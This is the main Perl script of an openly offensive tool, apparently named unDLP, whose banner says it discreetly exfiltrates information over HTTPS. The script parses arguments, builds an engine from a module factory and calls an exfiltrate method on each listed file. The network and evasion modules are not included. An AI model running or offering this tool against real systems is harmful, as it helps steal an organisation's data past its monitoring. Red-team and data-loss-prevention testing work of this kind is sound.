#!/usr/bin/perl

# ------------------------------------------------------------------------- #
#                                                                           #
# Main package, instantiating the parser and calling the right exfiltration #
# method.                                                                   #
#                                                                           #
# ------------------------------------------------------------------------- #

package Main;

use strict;
use warnings;

our $VERSION = '1.0';

require Entity::ModuleFactory;
require Entity::Parser;

print "
             ________  .____   __________
 __ __  ____ \\______ \\ |    |  \\______   \\
|  |  \\/    \\ |    |  \\|    |   |     ___/
|  |  /   |  \\|    `   \\    |___|    |
|____/|___|  /_______  /_______ \\____|
           \\/        \\/        \\/

Discreetly exfiltrate information via the HTTPS protocol.

Fell free to contact the maintainer for any further questions or improvement vectors.
Maintained by Nitrax <nitrax\@lokisec.fr>

";

my $parser = Parser->new();

$parser->parse(@ARGV);

my $engine =  ModuleFactory->new()->create($parser);

foreach my $file ($parser->getFiles) {
    $engine->exfiltrate($file);
}
